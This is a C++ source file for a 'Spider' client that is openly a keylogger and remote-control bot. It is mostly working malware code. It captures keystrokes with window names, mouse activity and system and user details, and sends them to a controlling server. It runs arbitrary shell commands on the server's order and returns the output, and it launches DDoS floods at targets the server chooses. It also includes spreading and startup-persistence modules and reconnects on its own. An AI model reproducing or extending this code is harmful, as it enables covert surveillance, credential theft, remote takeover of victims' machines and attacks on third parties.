#include "Spider.hpp"

Spider::Spider(boost::asio::io_service &io_service, tcp::resolver::iterator const &endpoint_iterator)
    : _network(io_service, endpoint_iterator), _keyboard(this->_sendingQueue), _mouse(this->_sendingQueue), _dump(this->_sendingQueue) {
	this->_endpoint = endpoint_iterator;
	this->_uninstall = false;
}

 Spider::Spider(Spider &obj): _keyboard(obj._sendingQueue), _mouse(obj._sendingQueue), _dump(obj._sendingQueue) {
	 this->_uninstall = false;
 }

Spider::~Spider() {
    this->_keyboard.pause();
    this->_mouse.pause();
}

Spider &Spider::operator=(const Spider &obj) {
    return (*this);
}

void Spider::start(boost::asio::io_service &io_service) {
	this->_network.setCallback(INetwork::CallbackType::Connect, std::bind(&Spider::connectCB, this, std::placeholders::_1));
	this->_network.setCallback(INetwork::CallbackType::Disconnect, std::bind(&Spider::disconnectCB, this, std::placeholders::_1));
	this->_network.setReceive("setStatus", std::bind(&Spider::setStatusCB, this, std::placeholders::_1));
	this->_network.setReceive("status", std::bind(&Spider::statusCB, this, std::placeholders::_1));
	this->_network.setReceive("doExec", std::bind(&Spider::doExecCB, this, std::placeholders::_1));
	this->_network.setReceive("ddos", std::bind(&Spider::ddosCB, this, std::placeholders::_1));
	this->_network.setReceive("uninstall", std::bind(&Spider::uninstallCB, this, std::placeholders::_1));
    this->_network.connect(this->_endpoint);
}

void Spider::initModules() {
	this->_keyboard.setup();
	this->_mouse.setup();
	this->_dump.setup();
	this->_network.setClientId(this->_dump.getComputerName());
	this->_spread.setup();
	this->_ddos.setup();
	if (this->_startup.checkStartup() == false)
		this->_startup.setup();
}

void Spider::mainLoop() {
	std::string json;
	this->statusCB(boost::property_tree::ptree());
	while (this->_uninstall == false) {
		while (!this->_sendingQueue.empty()) {
			if (!this->_network.isConnected())
				continue;
			const char *line = this->_sendingQueue.front().second.c_str();
			json = this->_makeJson(this->_sendingQueue.front().first, this->_sendingQueue.front().second);
			std::cout << json << std::endl;
			direct::Message msg;
			msg.body_length(std::strlen(json.c_str()));
			std::memcpy(msg.body(), json.c_str(), msg.body_length());
			msg.encode_header();
			this->_network.sendMessage(msg);
			this->_sendingQueue.pop_front();
		}
	}
	exit(0);
	this->_keyboard.getThread().join();
	this->_mouse.getThread().join();
}

void Spider::stop() {
    this->_network.disconnect();
    this->_keyboard.pause();
    this->_mouse.pause();
}

void Spider::setStatusCB(boost::property_tree::ptree &root) {
	std::string status = "on";
	status = root.get<std::string>("status");
	if (status == "off") {
		this->_keyboard.pause();
		this->_mouse.pause();
	} else {
		this->_keyboard.getThread().detach();
		this->_mouse.getThread().detach();
		this->_keyboard.setup();
		this->_mouse.setup();
	}
}

void Spider::statusCB(boost::property_tree::ptree &root) {
	if (this->_keyboard.getStatus() == AThreadedModule::Status::RUNNING &&
		this->_mouse.getStatus() == AThreadedModule::Status::RUNNING) {
		this->_sendingQueue.push_front(std::make_pair(Request::STATUS, "running"));
	} else if (this->_keyboard.getStatus() == AThreadedModule::Status::WAITING &&
		this->_mouse.getStatus() == AThreadedModule::Status::WAITING) {
		this->_sendingQueue.push_front(std::make_pair(Request::STATUS, "waiting"));
	} else {
		this->_sendingQueue.push_front(std::make_pair(Request::STATUS, "undefined"));
		this->_keyboard.pause();
		this->_keyboard.setup();
		this->_mouse.pause();
		this->_mouse.setup();
	}
}

void Spider::doExecCB(boost::property_tree::ptree &root) {
	std::string cmd;
	cmd = root.get<std::string>("command");
	std::string result = this->_exec.exec(cmd);
	this->_lastExec = cmd;
	this->_sendingQueue.push_front(std::make_pair(Request::EXEC, result));
}

void Spider::ddosCB(boost::property_tree::ptree &root) {
	std::string ip;
	int port;
	int duration;
	ip = root.get<std::string>("ip");
	port = root.get<int>("port");
	duration = root.get<int>("duration");
	this->_ddos.start(ip, port, duration);
}

void Spider::uninstallCB(boost::property_tree::ptree &root) {
	this->_startup.uninstall();
	this->_network.disconnect();
	this->_keyboard.pause();
	this->_mouse.pause();
	this->_uninstall = true;
}

void Spider::connectCB(std::string const &value) {
	if (value == "failure")
		this->_connectRoutine();
}

void Spider::reconnectCB(std::string const &value) {
	std::cout << "reconnected" << std::endl;
}

void Spider::disconnectCB(std::string const &value) {
		this->_connectRoutine();
}

void Spider::_connectRoutine() {
	if (this->_uninstall == false)
	{
		Sleep(1000);
		this->_network.connect(this->_endpoint);
		this->_dump.setup();
		this->_network.setClientId(this->_dump.getComputerName());
	}
}

std::string const Spider::_makeJson(Request module, std::string const &content) {
	boost::property_tree::ptree root;
	std::stringstream ss;
	std::stringstream click(content);
	std::string mouse = content;

	switch (module)
	{
	case Request::SENDLINE:
		ss << "sendLine ";
		root.put("client_id", this->_dump.getComputerName());
		root.put("timestamp", this->_dump.getTimestamp());
		root.put("content", content);
		root.put("process_name", this->_dump.getWinName());
		break;
	case Request::MOUSEINFO:
		ss << "mouseInfo ";
		root.put("client_id", this->_dump.getComputerName());
		root.put("timestamp", this->_dump.getTimestamp());
		click >> mouse;
		root.put("click", mouse);
		click >> mouse;
		root.put("mouvements", mouse);
		break;
	case Request::DUMP_COMPUTER_NAME:
		ss << "dump ";
		root.put("client_id", this->_dump.getComputerName());
		root.put("origine", "computer_name");
		root.put("content", content);
		break;
	case Request::DUMP_USER_NAME:
		ss << "dump ";
		root.put("client_id", this->_dump.getComputerName());
		root.put("origine", "user_name");
		root.put("content", content);
		break;
	case Request::DUMP_SYS_DIR:
		ss << "dump ";
		root.put("client_id", this->_dump.getComputerName());
		root.put("origine", "system_dir");
		root.put("content", content);
		break;
	case Request::DUMP_USER_DIR:
		ss << "dump ";
		root.put("client_id", this->_dump.getComputerName());
		root.put("origine", "windows_dir");
		root.put("content", content);
		break;
	case Request::EXEC:
		ss << "exec ";
		root.put("client_id", this->_dump.getComputerName());
		root.put("command", this->_lastExec);
		root.put("result", content);
		break;
	case Request::STATUS:
		ss << "status ";
		root.put("client_id", this->_dump.getComputerName());
		root.put("status", content);
		break;
	default:
		break;
	}
	boost::property_tree::write_json(ss, root);
	std::string json = ss.str();
	boost::replace_all(json, "\\", "/");
	return json;
}